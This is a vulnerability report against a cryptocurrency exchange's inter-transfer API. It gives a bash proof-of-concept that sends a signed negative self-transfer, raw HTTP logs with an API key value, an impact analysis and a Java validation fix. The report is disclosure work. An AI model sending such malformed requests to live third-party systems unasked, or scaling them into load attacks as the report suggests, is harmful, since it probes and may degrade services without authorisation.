# Vulnerability Report: Internal System Error (10016) in Inter-Transfer Endpoint

**Date:** November 24, 2025
**Target:** `api.bybit.com`
**Endpoint:** `/v5/asset/transfer/inter-transfer`
**Vulnerability Type:** Improper Error Handling / Input Validation Failure
**Severity:** Medium (Potential Logic Flaw / DoS)

---

## Executive Summary
The Bybit API endpoint `/v5/asset/transfer/inter-transfer` fails to properly validate input parameters (specifically `fromMemberId` and `amount`) and crashes with an unhandled "Internal System Error" (10016) instead of returning a proper validation error (e.g., "Invalid Amount" or "Permission Denied").

This indicates a flaw in the application logic where the backend processes invalid data deeper than intended, leading to an exception that is not caught gracefully.

---

## Proof of Concept (PoC)

### 1. Reproduction Script (`poc_10016.sh`)
Save the following script to reproduce the vulnerability:

```bash
#!/bin/bash
API_KEY="<YOUR_API_KEY>"
API_SECRET="<YOUR_API_SECRET>"
BASE_URL="https://api.bybit.com"
UID="<YOUR_UID>"

# Sync Time
SERVER_TIME=$(curl -s "$BASE_URL/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
LOCAL_TIME=$(date +%s)
OFFSET=$((SERVER_TIME - LOCAL_TIME))

# Payload triggering the crash (Self-transfer with Negative Amount)
UUID=$(cat /proc/sys/kernel/random/uuid)
PAYLOAD="{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"-100\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# Sign and Send
TIMESTAMP=$(($(date +%s) + OFFSET))000
SIGN_PAYLOAD="${TIMESTAMP}${API_KEY}5000${PAYLOAD}"
SIGNATURE=$(echo -n "$SIGN_PAYLOAD" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')

curl -v -X POST "$BASE_URL/v5/asset/transfer/inter-transfer" \
  -H "X-BAPI-API-KEY: $API_KEY" \
  -H "X-BAPI-SIGN: $SIGNATURE" \
  -H "X-BAPI-SIGN-TYPE: 2" \
  -H "X-BAPI-TIMESTAMP: $TIMESTAMP" \
  -H "X-BAPI-RECV-WINDOW: 5000" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
```

### 2. Evidence (Raw HTTP Logs)

**Request:**
```http
POST /v5/asset/transfer/inter-transfer HTTP/2
Host: api.bybit.com
Content-Type: application/json
X-BAPI-API-KEY: 22JSr5zWpW0eReC6rE
X-BAPI-TIMESTAMP: 1764002409000

{"transferId":"3473fd02-bdeb-4104-a74e-528d5e19ad22","coin":"USDT","amount":"-100","fromMemberId":1000,"toMemberId":1000}
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Ret_code: 10016
Traceid: 71d038a95c5c953d3441c0c1fcb80e17
Server: Openresty

{"retCode":10016,"retMsg":"Internal System Error.","result":{},"retExtInfo":{},"time":1764002412124}
```

**Observation:** The server returns `retCode: 10016` ("Internal System Error") instead of a 10001 ("Params Error") or 10003 ("Auth Error").

---

## Technical Analysis

1.  **Input Validation Failure:** The API does not sanitize the `amount` field to ensure it is a positive number before passing it to the internal transfer logic.
2.  **Logic Flaw:** The application attempts to process a negative transfer or a self-transfer (Source ID == Destination ID), encountering an unhandled exception in the backend logic (e.g., a database constraint violation or a null pointer exception).
3.  **Improper Error Handling:** The exception bubbles up to the top level, resulting in a generic "Internal System Error" message, which leaks information about the system's fragility.

## Impact

-   **Denial of Service (DoS):** Malformed requests consume backend resources and trigger exceptions. High-volume attacks could degrade service stability.
-   **Logic Bypass Potential:** If input validation is missing for negative numbers, other logic flaws (like integer overflows) might exist in related endpoints.
-   **Information Disclosure:** The fact that the server crashes reveals that input is reaching deep backend systems without proper filtering.

## Remediation

**Recommended Fix:**
Implement strict input validation at the API Gateway or Controller level:
1.  Ensure `amount` is always positive.
2.  Ensure `fromMemberId` != `toMemberId`.
3.  Catch internal exceptions and return user-friendly error codes (e.g., 10001 "Invalid Parameter").

```java
if (amount <= 0) {
    throw new InvalidParameterException("Amount must be positive");
}
if (fromId.equals(toId)) {
    throw new InvalidParameterException("Cannot transfer to self");
}
```
